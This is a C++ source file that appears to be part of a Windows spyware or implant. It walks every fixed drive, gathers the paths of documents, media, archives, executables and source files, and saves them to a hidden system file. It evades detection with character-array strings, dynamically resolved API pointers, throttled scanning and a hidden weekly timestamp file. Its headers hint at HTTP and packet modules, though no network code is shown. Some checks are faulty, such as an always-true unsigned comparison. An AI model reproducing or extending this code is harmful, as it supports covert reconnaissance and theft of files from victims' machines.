
#include <iostream>
#include<string.h>
#include<string>
#include "file.h"

#include "public.h"
#include "mission.h"

#include <windows.h>
#include "http.h"
#include <time.h>
#include "https.h"
#include "packet.h"
#include <vector>
#include "api.h"

using namespace std;

char szDirWindows[] = { '\\', 'W','i','n','d','o','w','s','\\',0 };
char szProgramFiles[] = { '\\', 'P','r','o','g','r','a','m',' ','F','i','l','e','s',0 };
char szProgramData[] = { '\\', 'P','r','o','g','r','a','m','D','a','t','a','\\',0 };
char szUsersAdminiAppData[] = { 'U','s','e','r','s','\\','A','D','M','I','N','I','~','1','\\','A','p','p','D','a','t','a',0 };
char szNtser[] = { 'n','t','u','s','e','r',0 };
char szNtserCapslock[] = { 'N','T','U','S','E','R',0 };
char szCurUserAppdDataFormat[] = { 'U','s','e','r','s','\\','%','s','\\','A','p','p','D','a','t','a',0 };
char szCurUserApplicationDataFromat[] = { 'U','s','e','r','s','\\','%','s','\\','A','p','p','l','i','c','a','t','i','o','n',' ','D','a','t','a',0 };


string gPrefixNames = ".ini.txt.doc.docx.xls.xlsx.ppt.pptx.pdf.dat.bmp.jpg.jpeg.png.mp3.amr.avi.mp4.wav.ogg.mpeg3.mpeg4"\
".exe.dll.apk.jar.dex.app.zip.rar.lnk.xml.json.htm.html.php.c.cpp.cs.java.py.go.js.css.asm";


AllFiles::AllFiles() {

}


AllFiles::~AllFiles() {

}




vector<FILE_INFOMATION> listDir(const char* PreStrPath)
{
	vector<FILE_INFOMATION> data;
	int counter = 0;
	int iRet = 0;

	char szAllFileForamt[] = { '*','.','*',0 };

	string strPath = string(PreStrPath);
	if (strPath.back() != '\\' && strPath.back() != '/')
	{
		strPath.append("\\");
	}
	strPath = strPath + szAllFileForamt;

	char szLastDir[] = { '.','.',0 };

	WIN32_FIND_DATAA stWfd = { 0 };

	HANDLE hFind = 0;

	hFind = lpFindFirstFileA(strPath.c_str(), (LPWIN32_FIND_DATAA)&stWfd);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		return data;
	}

	do
	{
		FILE_INFOMATION fi;
		fi.size = ((ULONGLONG)stWfd.nFileSizeHigh << 32) + stWfd.nFileSizeLow;
		fi.type = FILE_ATTRIBUTE_DIRECTORY;
		fi.type = stWfd.dwFileAttributes;
		fi.accesstime = stWfd.ftLastAccessTime;
		fi.createtime = stWfd.ftCreationTime;
		fi.modifytime = stWfd.ftLastWriteTime;
		lstrcpyA(fi.filename , stWfd.cFileName);
		fi.fnlen = lstrlenA(stWfd.cFileName);
		data.push_back(fi);

	} while (lpFindNextFileA(hFind, (LPWIN32_FIND_DATAA)&stWfd));

	lpFindClose(hFind);

	return data;
}


//this function need to be in a independent thread process
int __stdcall listAllFiles(const char* PreStrPath, int iLayer, HANDLE hfile)
{
	int counter = 0;
	int iRet = 0;

	char szAllFileForamt[] = { '*','.','*',0 };

	string strPath = string(PreStrPath);
	if (strPath.back()!= '\\' && strPath.back() != '/')
	{
		strPath.append("\\");
	}
	strPath  = strPath + szAllFileForamt;

	char szLastDir[] = { '.','.',0 };

	WIN32_FIND_DATAA stWfd = { 0 };

	HANDLE hFind = 0;

	hFind = lpFindFirstFileA(strPath.c_str(), (LPWIN32_FIND_DATAA)&stWfd);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		return counter;
	}

	do
	{
		if (stWfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (lstrcmpiA(stWfd.cFileName, szLastDir) == 0 || lstrcmpiA(stWfd.cFileName, ".") == 0)
			{
				continue;
			}
			else if (strstr(stWfd.cFileName, szDirWindows) || strstr(stWfd.cFileName, szProgramData) || strstr(stWfd.cFileName, szProgramFiles))
			{
				continue;
			}

			string strNextPath = string(PreStrPath) + stWfd.cFileName + "\\";

			counter = counter + listAllFiles(strNextPath.c_str(), iLayer + 1, hfile);
		}
		else
		{
			if (stWfd.nFileSizeLow || stWfd.nFileSizeHigh) {

				ULONGLONG pos = string(stWfd.cFileName).find(".");
				if (pos >= 0)
				{
					string prefixfn = string(stWfd.cFileName).substr(pos);
					pos = gPrefixNames.find(prefixfn);
					if (pos >= 0)
					{
						string filename = string(PreStrPath) + stWfd.cFileName + "\r\n";

						DWORD dwcnt = 0;
						iRet = lpWriteFile(hfile, filename.c_str(), (DWORD)filename.size(), &dwcnt, 0);

						counter++;
						if (counter % 256 == 0)
						{
							Sleep(50);
						}
					}
				}
			}
		}
	} while (lpFindNextFileA(hFind, (LPWIN32_FIND_DATAA)&stWfd));

	lpFindClose(hFind);

	return counter;
}


int refreshAllFiles() {
	string cfgfn = "diskFileTime.ini";

	int ret = 0;

	int result = 0;

	DWORD dwcnt = 0;

	int len = 0;

	int filesize = 0;

	time_t now = time(0);

	char data[1024] ;
	HANDLE hf = lpCreateFileA((char*)cfgfn.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hf == INVALID_HANDLE_VALUE) {
		hf = lpCreateFileA((char*)cfgfn.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	}

	filesize = lpGetFileSize(hf, 0);
	ret = lpReadFile(hf, data, filesize, &dwcnt, 0);
	*(data + filesize) = 0;

	string strtime = data;

	time_t last = atoi(strtime.c_str());
	if (now - last >= 7 * 24 * 3600)
	{
		len = wsprintfA(data, "%08u", (int)now);
		ret = lpSetFilePointer(hf, 0, 0, FILE_BEGIN);
		ret = lpWriteFile(hf, data, len, &dwcnt, 0);
		result = TRUE;
	}

	lpCloseHandle(hf);

	ret = lpSetFileAttributesA(cfgfn.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);

	return result;
}


int getDrivers(char * strDisk,int size) {

	int iLen = GetLogicalDriveStringsA(size, strDisk);
	if (iLen <= 0)
	{
		return FALSE;
	}
	return iLen;
}



//this function need to be in a independent thread process
int __stdcall getAllFiles()
{
	int iRet = 0;
	try
	{
		if (refreshAllFiles() == 0)
		{
			return 0;
		}

		char strDisk[128] = { 0 };
		int iLen = GetLogicalDriveStringsA(sizeof(strDisk), strDisk);
		if (iLen <= 0)
		{
			return FALSE;
		}
		char* strDiskPtr = strDisk;

		DWORD dwFilesCnt = 0;
		HANDLE hFile = lpCreateFileA(ALLFILES_FILENAME, GENERIC_READ | GENERIC_WRITE, 0, 0,
			CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			return FALSE;
		}

		for (int i = 0; i < iLen / 4; ++i)
		{
			iRet = GetDriveTypeA(strDiskPtr);
			if (iRet == DRIVE_FIXED /*|| iRet == DRIVE_REMOTE || iRet == DRIVE_CDROM || iRet == DRIVE_REMOVABLE*/)
				//会出现不存在软盘异常 必须去掉DRIVE_REMOVABLE
			{
				if ((*strDiskPtr == 'A' || *strDiskPtr == 'B' || *strDiskPtr == 'a' || *strDiskPtr == 'b') && iRet == DRIVE_REMOVABLE)
				{
				}
				else {
					int filescounter = dwFilesCnt + listAllFiles(strDiskPtr, 1, hFile);
					dwFilesCnt += filescounter;
				}
			}
			strDiskPtr += 4;
		}

		lpCloseHandle(hFile);

		return TRUE;
	}
	catch (...)
	{

		return FALSE;
	}
}
